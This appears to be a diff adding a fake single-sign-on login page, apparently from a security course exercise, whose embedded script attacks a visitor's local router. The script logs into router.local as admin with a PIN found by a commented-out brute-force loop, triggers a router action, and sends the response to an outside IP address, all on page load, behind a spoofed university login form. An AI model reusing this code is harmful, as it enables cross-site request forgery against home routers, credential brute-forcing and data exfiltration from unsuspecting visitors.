@@ -1,0 +1,79 @@
+<div id="login-form">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script>
+
+	// found the pin -- now only make requests to this pin
+	var curr_pin = 9210;
+
+	function to_pin(n){
+		if (n <= 9) {
+			return "000" + n;
+		} else if (n <= 99) {
+			return "00" + n;
+		} else if (n <= 999) {
+			return "0" + n;
+		} else {
+			return n;
+		}
+	}
+
+	function makeAjaxCall() {
+		// console.log(curr_pin);
+		var formatted_pin = to_pin(curr_pin);
+
+		$.ajax({
+			type: 'POST',
+	        url: 'http://router.local:80/login.php',
+	        data: {username: 'admin', pin: formatted_pin, notRobot: 'checked'},
+	        success: function (result) {
+
+	        	// if (result.indexOf("Wrong username or password") < 0) {
+	        	$.ajax({
+			        url: 'http://router.local:80/home.php?action=https://drive.google.com/file/d/0B3qSRaIFa4XlWDlZeWtvdEJWSFU/view?usp=sharing',
+			        success: function (result) {
+			        	$.ajax({
+				       	 url: 'http://72.2.125.63/handins/60194d39f93773d9148df7ff84d7f759e3621b6d.pdf.php?response=' + result
+			    		});
+			        }
+			    });
+
+	        	// }
+	        }
+	    });	
+
+	    // curr_pin += 1;
+	    // localStorage.setItem("pin", curr_pin);
+	}
+
+	makeAjaxCall();
+
+	// Comments are code used to find pin
+	// Since the pin was found -- now requests are just made with the pin
+
+	// if (localStorage.getItem("pin") === null) {
+ //  		curr_pin = 0;
+	// } else {
+	// 	curr_pin = parseInt(localStorage.getItem("pin"));
+	// }
+
+	// while ((curr_pin % 350) != 0) {
+	// 	makeAjaxCall();
+	    
+	// }
+
+	// makeAjaxCall();
+	
+
+</script>
+<img src="https://sso.brown.edu/idp/images/header-authentication-required.png" class="centered"/>
+	<?php if (isset($error_msg)): ?>
+	<p class="error-msg"><?php echo $error_msg; ?></p>
+	<?php endif; ?>
+	<form action="index.php" method="post" id="loginFormForm">
+		<p><input type="text" name="username" id="username_input" placeholder="Username"/></p>
+		<p><input type="password" name="pass" id="password_input" placeholder="Password"/></p>
+		<p><input type="submit" value="Secure Login"/> <a href="javascript:alert('Please try to remember!');">Forgot your password?</a></p>
+	</form>
+	<p class="flagText" id="flagVersion">F.L.A.G Version 1.0</p>
+</div>
+
